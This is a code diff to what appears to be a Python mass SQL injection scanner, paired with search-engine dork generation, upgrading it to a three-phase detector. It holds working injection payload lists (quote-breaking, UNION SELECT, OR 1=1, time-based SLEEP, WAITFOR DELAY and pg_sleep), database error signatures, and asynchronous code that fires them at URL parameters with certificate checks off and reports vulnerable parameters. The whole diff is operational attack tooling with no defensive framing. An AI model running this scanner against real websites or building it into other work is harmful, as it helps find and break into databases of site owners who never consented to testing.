@@ -546,54 +546,195 @@ def build_custom_dorks(keywords, dork_type, site_type, page_param, max_count):
     return all_dorks
 
 # ──────────────────────────────────────────────
-#  SQL SCANNER
+#  SQL SCANNER (verified, low false-positive)
 # ──────────────────────────────────────────────
 
-SQL_PAYLOADS = [
-    "'", "''", "`", "\"", "')", "'))", "')))", "\";",
-    " order by 10--", " union select 1,2,3,4,5,6--",
-    " OR 1=1--", "admin' --", "' OR 'a'='a",
-    " AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
-    " %' OR '1'='1", "';", "\\", "%27",
-    "WAITFOR DELAY '0:0:5'--", "OR 1=1#", "') OR ('1'='1"
+ERROR_PAYLOADS = [
+    "'", "''", "\"", "')", "'))", "\";", "';",
+    "\\", "%27",
+]
+
+UNION_PAYLOADS = [
+    " union select 1,2,3,4,5,6--",
+    " order by 100--",
+    " OR 1=1--",
+    "' OR '1'='1",
+    "') OR ('1'='1",
+    " OR 1=1#",
+]
+
+TIME_PAYLOADS = [
+    (" AND SLEEP({delay})--", "mysql"),
+    (" AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", "mysql"),
+    ("'; WAITFOR DELAY '0:0:{delay}'--", "mssql"),
+    (" AND pg_sleep({delay})--", "postgres"),
 ]
 
 SQL_ERRORS = [
-    "SQL syntax", "mysql_fetch_array", "MySQL Error", "PostgreSQL",
-    "Microsoft OLE DB Provider for SQL Server", "JDBC Driver",
-    "SQLite/JDBCDriver", "System.Data.SqlClient.SqlException",
-    "Invision Power Board Database Error", "Warning: mysql_connect()",
-    "Driver [pdo_mysql]", "ORA-00933", "Syntax error in SQL statement",
-    "Dynamic SQL Error", "valid MySQL result",
-    "Unclosed quotation mark after the character string",
-    "pg_query(): Query failed", "SQLITE_ERROR",
-    "Warning: pg_exec()", "supplied argument is not a valid MySQL"
+    "you have an error in your sql syntax",
+    "mysql_fetch_array()", "mysql_fetch_assoc()",
+    "mysql_num_rows()", "mysql_connect()",
+    "supplied argument is not a valid mysql",
+    "warning: mysql_", "valid mysql result",
+    "unclosed quotation mark after the character string",
+    "microsoft ole db provider for sql server",
+    "microsoft sql native client error",
+    "system.data.sqlclient.sqlexception",
+    "jdbc driver", "jdbcdriver",
+    "ora-00933", "ora-01756", "ora-00921",
+    "pg_query(): query failed", "pg_exec()",
+    "warning: pg_", "unterminated quoted string",
+    "sqlite_error", "sqlite3::",
+    "dynamic sql error", "syntax error in sql statement",
+    "invision power board database error",
+    "driver [pdo_mysql]",
+    "sqlstate[",
 ]
+
+TIMEOUT = aiohttp.ClientTimeout(total=12)
+
+async def _fetch(session, url):
+    try:
+        async with session.get(url, timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
+            body = await r.text(errors='ignore')
+            return r.status, body, len(body)
+    except asyncio.TimeoutError:
+        return 0, "", 0
+    except Exception:
+        return -1, "", 0
+
+def _find_errors(body):
+    body_l = body.lower()
+    found = []
+    for e in SQL_ERRORS:
+        if e in body_l:
+            found.append(e)
+    return found
+
+def _inject_param(base, params, param_idx, payload):
+    new_params = list(params)
+    new_params[param_idx] += payload
+    return f"{base}?{'&'.join(new_params)}"
 
 async def check_sql(session, url):
     if "?" not in url:
         return None
+
     base_part = url.split("?")[0]
     params = url.split("?")[1].split("&")
-    tasks = []
-    for payload in SQL_PAYLOADS:
-        for i in range(len(params)):
-            new_params = list(params)
-            new_params[i] += payload
-            test_url = f"{base_part}?{'&'.join(new_params)}"
-            tasks.append(_sql_test(session, test_url))
-    results = await asyncio.gather(*tasks)
-    return next((r for r in results if r), None)
 
-async def _sql_test(session, test_url):
-    try:
-        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
-            body = await resp.text()
-            if any(e.lower() in body.lower() for e in SQL_ERRORS):
-                return f"[VULN] {test_url}"
-    except Exception:
-        pass
-    return None
+    baseline_status, baseline_body, baseline_len = await _fetch(session, url)
+    if baseline_status <= 0:
+        return None
+
+    baseline_errors = set(_find_errors(baseline_body))
+
+    confirmed_vulns = []
+
+    for i in range(len(params)):
+        # ── Phase 1: Error-based detection ──
+        hits = []
+        for payload in ERROR_PAYLOADS:
+            test_url = _inject_param(base_part, params, i, payload)
+            status, body, body_len = await _fetch(session, test_url)
+            if status <= 0:
+                continue
+
+            new_errors = set(_find_errors(body)) - baseline_errors
+            if new_errors:
+                hits.append({"payload": payload, "url": test_url, "errors": new_errors, "type": "error"})
+                if len(hits) >= 2:
+                    break
+
+            len_diff = abs(body_len - baseline_len)
+            if len_diff > 500 and new_errors:
+                hits.append({"payload": payload, "url": test_url, "errors": new_errors, "type": "error+diff"})
+                if len(hits) >= 2:
+                    break
+
+        if len(hits) >= 2:
+            confirmed_vulns.append({
+                "param": params[i].split("=")[0],
+                "url": hits[0]["url"],
+                "type": "Error-Based",
+                "db": list(hits[0]["errors"])[0],
+                "payloads": len(hits),
+            })
+            continue
+
+        # ── Phase 2: Union/Boolean-based detection ──
+        bool_hits = []
+        for payload in UNION_PAYLOADS:
+            test_url = _inject_param(base_part, params, i, payload)
+            status, body, body_len = await _fetch(session, test_url)
+            if status <= 0:
+                continue
+
+            new_errors = set(_find_errors(body)) - baseline_errors
+            len_diff = abs(body_len - baseline_len)
+
+            if new_errors:
+                bool_hits.append({"payload": payload, "url": test_url, "type": "union"})
+                if len(bool_hits) >= 2:
+                    break
+
+            if len_diff > 1000 and status != baseline_status:
+                bool_hits.append({"payload": payload, "url": test_url, "type": "boolean"})
+                if len(bool_hits) >= 2:
+                    break
+
+        if len(bool_hits) >= 2:
+            confirmed_vulns.append({
+                "param": params[i].split("=")[0] if "=" in params[i] else params[i],
+                "url": bool_hits[0]["url"],
+                "type": "Union/Boolean",
+                "db": "unknown",
+                "payloads": len(bool_hits),
+            })
+            continue
+
+        # ── Phase 3: Time-based blind detection ──
+        for tpl, db_type in TIME_PAYLOADS:
+            short_payload = tpl.format(delay=0)
+            test_url_short = _inject_param(base_part, params, i, short_payload)
+            t1 = asyncio.get_event_loop().time()
+            s1, _, _ = await _fetch(session, test_url_short)
+            time_short = asyncio.get_event_loop().time() - t1
+
+            if s1 <= 0:
+                continue
+
+            long_payload = tpl.format(delay=5)
+            test_url_long = _inject_param(base_part, params, i, long_payload)
+            t2 = asyncio.get_event_loop().time()
+            s2, _, _ = await _fetch(session, test_url_long)
+            time_long = asyncio.get_event_loop().time() - t2
+
+            if s2 <= 0:
+                continue
+
+            if time_long >= 4.5 and time_long > time_short + 3.0:
+                long_payload2 = tpl.format(delay=3)
+                test_url_verify = _inject_param(base_part, params, i, long_payload2)
+                t3 = asyncio.get_event_loop().time()
+                s3, _, _ = await _fetch(session, test_url_verify)
+                time_verify = asyncio.get_event_loop().time() - t3
+
+                if time_verify >= 2.5 and time_verify > time_short + 1.5:
+                    confirmed_vulns.append({
+                        "param": params[i].split("=")[0] if "=" in params[i] else params[i],
+                        "url": test_url_long,
+                        "type": f"Time-Based Blind ({db_type})",
+                        "db": db_type,
+                        "payloads": 2,
+                    })
+                    break
+
+    if not confirmed_vulns:
+        return None
+
+    v = confirmed_vulns[0]
+    return f"[VULN:{v['type']}] [param:{v['param']}] {url}"
 
 # ──────────────────────────────────────────────
 #  GLOBAL QUEUE WITH POSITION TRACKING
